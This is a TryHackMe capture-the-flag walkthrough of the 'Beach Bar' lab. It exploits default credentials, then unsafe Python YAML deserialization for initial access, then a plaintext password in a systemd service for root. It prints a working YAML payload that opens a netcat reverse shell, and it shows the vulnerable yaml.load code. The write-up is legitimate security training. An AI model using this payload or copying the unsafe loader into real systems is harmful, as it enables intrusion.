# Beach Bar Walkthrough

## Intro
Welcome to the Beach Bar challenge, here is the link to the [room](https://tryhackme.com/room/https://tryhackme.com/room/hh-beachbar-d849f7f7) on TryHackMe.

This is an easy level challege about web exploitation and a quick privilege escalation.

"*Welcome back to the Byte Lotus — this time the sand is warm, the deck lights are coming up, and the beach bar's jukebox takes requests from anyone with a phone. You spend the evening as a guest at the rail who simply notices things: a DJ who never logs out, a song queue that accepts a little more than song titles, a service down the boardwalk quietly announcing "something".*

*The beachside guest-experience build shipped on a deadline, and the night-shift developer wired the jukebox straight into the floor with the trimmings still attached.* "


Whenever you feel ready press on "Start Machine" and connect via OpenVPN or by using the AttackBox.

Let's begin!

<br/>
<br/>

## The Challenge
We can start by navigating to `http://10.82.180.111/`, here we see a login page, let's check the source code.
Here we spot a comment containig the credentials of a demo that has not been disabled:
``` html
  <!--
    staff note: the demo DJ login is still enabled for the soft opening.
    dj / dj  -- swap this before the season starts (ticket BAR-7)
  -->
  <form method="post">
    <label for="username">Username</label>
    <input type="text" id="username" name="username" autocomplete="off" autofocus>
    <label for="password">Password</label>
    <input type="password" id="password" name="password" autocomplete="off">
    <button type="submit">Step up to the decks</button>
  </form>
```

Login with `dj:dj`.

Once logged in there is a dashboard with 2 functions, to either import or export a playlist.
With the import option we can upload a file.

A couple of things to notice here is that, with wappalyzer, we can see the back-end is Python plus teh upload asks us for a YAML file.

This mean that we should test for safe/unsafe python YAML serialization/deserialization.

When the YAML parser encounters specific tags, it attempts to resolve them by importing the corresponding Python module and executing the function or instantiating the object during the parsing process. 

First we export their playlist to check how the YAML file is created:
```yaml
# Beach Bar jukebox playlist export
playlist:
  name: Sunset Session
  vibe: golden hour
  tracks:
    - artist: Khruangbin
      title: Maria Tambien
    - artist: Men I Trust
      title: Show Me How
    - artist: Crumb
      title: Locket
```

We can test directly with a reverse shell payload, in a real environment start probing which python modules gets accepted first, using safe payloads.

Since this is an easy CTF i expect that the couple most common payloads and a reverse shell will work directly.

```yaml
playlist:
name: !!python/object/new:os.system ["rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.82.72.121 1234 >/tmp/f"]
tracks: []
```

Prepare a listener before sending it:
```bash
nc -lvnp 1234
```

Now send it, and yes it worked at first try! we now have a shell.

Running `whoami` it says we are user "bartender".
Before doing anything let's stabilize the shell and make it fully interactive, i made a full guide [here](https://github.com/Maat-Cyber/Maat-Cyber-World/blob/main/Tips-%26-Resources/Reverse_Shell-Upgrade.md).

<br/>

### User Flag
Once we are done with that, we can get the first flag:
```bash
cat /home/bartender/user.txt
```
--> REDACTED

<br/>

### Privilege Escalation
Looking around a bit we can find an interesting directory under `/opt/` called "beach-bar".
Here we can explore a bunch of python scripts:
```bash
cat  jukeboxd.py 
```
```python
#!/usr/bin/env python3

import argparse
import time

NOW_PLAYING = [
    "Khruangbin - Maria Tambien",
    "Men I Trust - Show Me How",
    "Crumb - Locket",
    "Mac DeMarco - Chamber of Reflection",
]


def main():
    parser = argparse.ArgumentParser(description="Beach Bar jukebox streamer")
    parser.add_argument("--stream-pass", required=True, help="stream backend password")
    parser.add_argument("--bitrate", default="320k")
    args = parser.parse_args()

    i = 0
    while True:
        track = NOW_PLAYING[i % len(NOW_PLAYING)]
        i += 1
        time.sleep(30)


if __name__ == "__main__":
    main()

```

This must be a some service running in the background, worth investigating.

The app.py:
```python
#!/usr/bin/env python3

import os
import yaml
from functools import wraps
from flask import (
    Flask, render_template, request, redirect,
    url_for, session, flash, Response,
)

app = Flask(__name__)
app.secret_key = "beach-bar-jukebox-fixed-session-key"

USERS = {
    "dj": "dj",
}

SAMPLE_PLAYLIST = """\
# Beach Bar jukebox playlist export
playlist:
  name: Sunset Session
  vibe: golden hour
  tracks:
    - artist: Khruangbin
      title: Maria Tambien
    - artist: Men I Trust
      title: Show Me How
    - artist: Crumb
      title: Locket
"""


def login_required(f):
    @wraps(f)
    def wrapper(*args, **kwargs):
        if not session.get("user"):
            return redirect(url_for("login"))
        return f(*args, **kwargs)
    return wrapper


@app.route("/")
def index():
    if session.get("user"):
        return redirect(url_for("dashboard"))
    return redirect(url_for("login"))


@app.route("/login", methods=["GET", "POST"])
def login():
    if request.method == "POST":
        u = request.form.get("username", "")
        p = request.form.get("password", "")
        if USERS.get(u) == p:
            session["user"] = u
            return redirect(url_for("dashboard"))
        flash("Invalid credentials.")
    return render_template("login.html")


@app.route("/logout")
def logout():
    session.clear()
    return redirect(url_for("login"))


@app.route("/dashboard")
@login_required
def dashboard():
    return render_template("dashboard.html", user=session["user"])


@app.route("/export")
@login_required
def export():
    return Response(
        SAMPLE_PLAYLIST,
        mimetype="application/x-yaml",
        headers={"Content-Disposition": "attachment; filename=playlist.yml"},
    )


@app.route("/import", methods=["GET", "POST"])
@login_required
def import_playlist():
    result = None
    error = None
    if request.method == "POST":
        content = request.form.get("playlist", "")
        if "playlist_file" in request.files:
            f = request.files["playlist_file"]
            if f and f.filename:
                content = f.read().decode("utf-8", "replace")
        try:
            parsed = yaml.load(content, Loader=yaml.Loader)
            result = parsed
        except Exception as e:
            error = f"Could not load playlist: {e}"
    return render_template("import.html", result=result, error=error)


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=80)

```

Yea the `app.py` is not relevant here, let's get back to the `jukeboxd`, the ending "d" suggest us that it cuold be a systemd service:
```bash
systemct show jukeboxd.service
```

We can see that it exists and the file is located at `/etc/systemd/system/jukeboxd.service`.
The service executes this command:
```bash
ExecStart={ path=/opt/beach-bar/venv/bin/python ; argv[]=/opt/beach-bar/venv/bin/python /opt/beach-bar/jukeboxd/jukeboxd.py --stream-pass Sunset..REDACTED_FOR_WRITEUP --bitrate 320k ; ignore_errors=no ; start_time=[n/a] ; stop_time=[n/a] ; pid=0 ; code=(null) ; status=0/0 }
```

Interesting that looks like a password, maybe of the root user, we can test the hypotesis:
```bash
su root
```

Insert the password and we are root, time for the final flag:
```bash
cat /root/root.txt
```

--> REDACTED


<br/>
<br/>

Congratulations, you have successfully exploited the unsafe YAML deserialization, gained initial access and finally found a plaintext credential in a system service and gained root access.

Hope you had fun following along and completing the challenge.

Catch you in the next CTF 😃 
